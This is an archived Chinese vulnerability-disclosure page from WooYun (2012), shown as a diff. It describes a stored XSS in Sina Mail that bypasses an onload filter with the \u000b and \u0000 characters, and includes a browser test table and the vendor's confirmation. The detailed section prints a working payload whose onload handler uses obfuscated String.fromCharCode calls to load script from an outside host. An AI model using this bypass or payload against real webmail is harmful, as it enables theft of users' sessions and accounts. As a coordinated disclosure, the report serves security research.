@@ -1,0 +1,300 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		新浪邮箱正文存储型XSS，空字节不仅能上传，还能跨站  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		新浪邮箱正文存储型XSS，空字节不仅能上传，还能跨站  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/gainover">gainover</a> 
+</li><li>提交时间：		2012-05-17 15:14</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-05-17：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-05-17：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-05-27：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-06-06：	细节向普通白帽子公开<br/>
+									2012-06-16：	细节向实习白帽子公开<br/>
+									2012-07-01：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">说到00这个东西，大家最熟悉的应该是上传截断，%00之类的。 <br />
+00 通常表示字符串结束， 在C里是\0， JS里通常写为\u0000。 <br />
+关于\0在XSS的应用，好像不算是很多吧，比较有名的 xss list（http://ha.ckers.org/xss.html）里对此也只有几个比较古老版本浏览器（IE6，NS啥的）的应用。<br />
+<br />
+这里我发现在IE7，IE9 （没IE8的机器）中都可以使用\u0000来绕过一些正则，此外本文还发现另外一个特殊的字符，可以绕过某些正则的过滤。在详细说明中会提到。<br />
+<br />
+这里我就用这个技巧，绕过了新浪邮箱里的过滤，成功实现XSS。 <br />
+<br />
+PS：感谢粽子同学对此测试的帮助。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1. 其实这个过程是最基本的思路，写入以下HTML内容<br />
+<br />
+<br />
+<br />
+&lt;img src=&#039;http://www.wooyun.org/logo/CNVDlogo.jpg&#039; onload=&#039;alert(1)&#039;&gt;<br />
+<br />
+<br />
+<br />
+2. 不出意外, onload=&#039;alert(1)&#039;被过滤掉了。<br />
+<br />
+<br />
+<br />
+3. 继续测试过滤方式，输入以下代码<br />
+<br />
+<br />
+<br />
+&lt;img src=&#039;http://www.wooyun.org/logo/CNVDlogo.jpg&#039; onload/=&#039;alert(1)&#039;&gt; <br />
+<br />
+<br />
+<br />
+4. 看输出 onload\/=&#039;alert(1)&#039; 这个可以说明：<br />
+<br />
+<br />
+<br />
+新浪不是直接replace掉 onload之类的字符，<br />
+<br />
+<br />
+<br />
+5. 经过测试onload空白符=alert(&#039;1&#039;) 一样会被过滤，可以推出：<br />
+<br />
+<br />
+<br />
+大概的正则是 onload\s+=任意连续字符 被过滤为空<br />
+<br />
+<br />
+<br />
+6. 根据以上测试结果，我们可以构建一个挑战性的模型如下:<br />
+<br />
+<br />
+<br />
+onload某个不是空白的字符=alert(&#039;1&#039;)  <br />
+<br />
+<br />
+<br />
+7. 构建一个测试页面： 见（http://xssreport.sinaapp.com/toolmao.com/sinamail.htm）<br />
+<br />
+<br />
+<br />
+测试内容主要为 &lt;img src=图片 onload某个字符=alert(某个字符ASCII) /&gt;<br />
+<br />
+<br />
+<br />
+如果弹出了某个字符，就说明这个字符加在onload后面不影响onload=alert()的运行<br />
+<br />
+<br />
+<br />
+8. 测试结果中比较意外的有2个，IE9支持0， IE7和IE9都支持11：<br />
+<br />
+<br />
+<br />
+浏览器 onload*=alert 测试结果<br />
+<br />
+<br />
+<br />
+IE9:  0,32,13,12,11,10,9<br />
+<br />
+IE8:  没机器测试<br />
+<br />
+IE7: 32,13,12,11,10,9,<br />
+<br />
+FF: 32,13,10,9<br />
+<br />
+Chrome:32,9,13,10,12<br />
+<br />
+<br />
+<br />
+10. 除了0之外， 这个11 （16进制\u000b）确实挺陌生的，9，10，12，13，都是相对常见的。<br />
+<br />
+<br />
+<br />
+11. 既然如此，我们测试 \u0000 ，和 \u000b<br />
+<br />
+<br />
+<br />
+12. 由于抓包工具，没办法比较直接的发送这类字符，自己写了个工具发送了一下。<br />
+<br />
+POST的内容大概如下，这里只列出最关键的msgtxt字段：<br />
+<br />
+<br />
+<br />
+</p><pre><code>&quot;msgtxt&quot;:&quot;&lt;img src=&#039;http://www.wooyun.org/logo/CNVDlogo.jpg&#039; onload\u000b=&#039;-function(){var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src=String.fromCharCode(47,47,97,112,112,109,97,107,101,114,46,115,105,110,97,97,112,112,46,99,111,109,47,109,46,106,115);document.body.appendChild(s);}()&#039;&gt;&lt;/img&gt;&quot;,</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+13. 由于\u0000仅在IE9下有效，这里我用\u000b绕过。 效果见漏洞证明！<br />
+<br />
+<br />
+<br />
+14. 这里还得说一下，\u0000 甚至可以写为<br />
+<br />
+<br />
+<br />
+xxx.innerHTML=&quot;&lt;img on\u0000load=&#039;alert(1)&#039;&gt;&quot; 一样可以运行～ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">测试分别在WIN7+IE9， vista+IE7, XP+IE7进行，均成功！<br />
+<br />
+<br />
+<br />
+WIN7+IE9<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/17143350fe015d31c7c93dced1ef9eeedefecdd5.jpg" target="_blank"><img src="../images/17143350fe015d31c7c93dced1ef9eeedefecdd5.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+XP+IE7<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/1714342059f43e3bc6c615b006a49d2515255804.jpg" target="_blank"><img src="../images/1714342059f43e3bc6c615b006a49d2515255804.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+占用乌云一点点存储空间， 俺简陋的工具，也出来露露脸吧！！<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/17143637be58ddd360910cc1cc632f80417305b7.jpg" target="_blank"><img src="../images/17143637be58ddd360910cc1cc632f80417305b7.jpg" alt="" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过滤\u0000 与\u000b </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/gainover" title="gainover">gainover</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-07244" title="新浪邮箱正文存储型XSS，空字节不仅能上传，还能跨站">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2012-05-17 16:39</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢gainover的详尽挖掘和分析，我们尽快修复并查找类似问题</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="7244";
+var bugRating="2";
+var myRating="";
+var ratingCount="7";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
